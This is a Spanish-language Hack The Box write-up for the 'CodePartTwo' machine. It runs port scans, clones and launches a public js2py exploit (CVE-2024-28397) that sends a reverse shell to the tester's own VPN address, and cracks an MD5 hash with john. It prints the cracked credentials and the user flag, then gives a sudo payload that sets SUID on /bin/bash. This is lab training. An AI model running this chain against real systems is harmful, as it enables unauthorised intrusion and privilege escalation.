# CodePartTwo -UF

tags: #facil

***

Comenzamos a explorar cuáles son los puertos que tiene abiertos esta máquina:

```bash
nmap -sS --top-ports 1500 10.10.11.82 -n -Pn -vvv --open -oN ports --min-rate 200
```

![Pasted image 20251008155913](<../../../.gitbook/assets/Pasted image 20251008155913.png>)

Es interesante ver que no hay ningún servicio web, y que además tenemos el puerto ssh abierto, por lo que intuimos que esa será nuestra puerta a la máquina. Voy a ejecutar ahora el siguiente comando para conocer las versiones de los servicios que corren por esos puertos y ver si podemos atacar:

```bash
nmap -sVC 10.10.11.82 -p22,8000 -oN versions -vvv
```

![Pasted image 20251008160247](<../../../.gitbook/assets/Pasted image 20251008160247.png>)

Vemos que en el puerto 8000, hay un servicio hhtp, así que antes de empezar con el fuzzing, vamos a echarle un ojo:

![Pasted image 20251011150145](<../../../.gitbook/assets/Pasted image 20251011150145.png>)

Vemos de primeras que tiene tres botones, y uno de ellos nos descarga un archivo .zip.

Antes de abrirlo, voy a aplicar fuzzing con gobuster para descubrir directorios y archivos ocultos:

```bash
gobuster dir -u http://10.10.11.82/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x .php,.xml,.txt,.html -t 40 -o dirs.txt
```

No consigo encontrar mucha cosa, lo que ya aparece en la main. Accedo al formulario register, y me creo un usuario con las credenciales victhor:victhor para ver el backend:

![Pasted image 20251012135109](<../../../.gitbook/assets/Pasted image 20251012135109.png>)

Parece un compilador de Python:

![Pasted image 20251012135234](<../../../.gitbook/assets/Pasted image 20251012135234.png>)

Esto me llama la atención, así que después de probar un par de cosas, intento ver si es vulnerable a un SSTI, y así es:

En la página principal veo que hay una opción para descargarse la app, así que lo hago para intentar analizar de qué se trata:

![1000](<../../../.gitbook/assets/Pasted image 20251125202545.png>)

Analizando el código fuente del archivo app.py vemos que importa unas librerías, de las cuales hay una que es vulnerable a un ataque que nos permite ejecutar comandos, **js2py**:

![Pasted image 20251125202433](<../../../.gitbook/assets/Pasted image 20251125202433.png>)

Haciendo una búsqueda, encuentro un exploit en github que nos permite hacer una ejecución remota de comandos, así que directamente vamos a intentar enviarnos una reverse shell. Para ello instalamos el repositorio y ejecutamos el exploit con los parámetros que nos pide, que son --target, --lhost y --lport. En el host pondré la IP de la VPN de Hack The Box.

```bash
https://github.com/naclapor/CVE-2024-28397
git clone https://github.com/naclapor/CVE-2024-28397
cd CVE-2024-28397
python3 exploit.py --target http://10.10.11.82:8000/run-code --lhost 10.10.16.32 --lport 443
```

Ahora me pongo en escucha con netcat por el puerto 443:

```bash
nc -lvnp 443 
```

Estamos dentro de la máquina.

Al inicio cuando nos descargamos la app vimos que en la carpeta instance había un archivo llamado users.db pero que estaba vacío, pero es posible que dentro de la máquina si que haya algunos datos, así que lo leemos:

Vemos que hay un usuario llamado **marco** (que también lo pudimos ver accediendo a la carpeta /home) y lo que parece una contraseña cifrada. Voy a probar usar la herramienta hash identifier para ver si efectivamente se trata de un hash:

![Pasted image 20251125213805](<../../../.gitbook/assets/Pasted image 20251125213805.png>)

```bash
649c9d65a206a75f5abe509fe128bce5
```

Y así es, así que la pasamos a un documento llamado **hash** y la crackeamos con john the reaper usando los siguientes comandos:

```bash
echo "649c9d65a206a75f5abe509fe128bce5" > hash
john --wordlist=/usr/share/wordlists/rockyou.txt hash --format=RAW-MD5
```

![Pasted image 20251125214041](<../../../.gitbook/assets/Pasted image 20251125214041.png>)

```bash
marco:sweetangelbabylove
```

Teniendo el puerto ssh abierto, nos conectamos con el usuario marco:

```bash
ssh marco@10.10.11.82
```

Y tenemos la flag de user: **7e15eba687169c81599778d21d947db5**

![Pasted image 20251125220211](<../../../.gitbook/assets/Pasted image 20251125220211.png>) Ahora con el comando **sudo -l** veo lo siguiente:

![Pasted image 20251125214328](<../../../.gitbook/assets/Pasted image 20251125214328.png>)

Se trata de un script de python:

Este es su contenido:

Lo que voy a tratar de hacer es eliminar todo el contenido y crear otro con una orden muy simple que consiste en agregar permisos SUID a la bash, con el siguiente payload:

```python
import os os.system("chmod u+s /bin/bash")
```
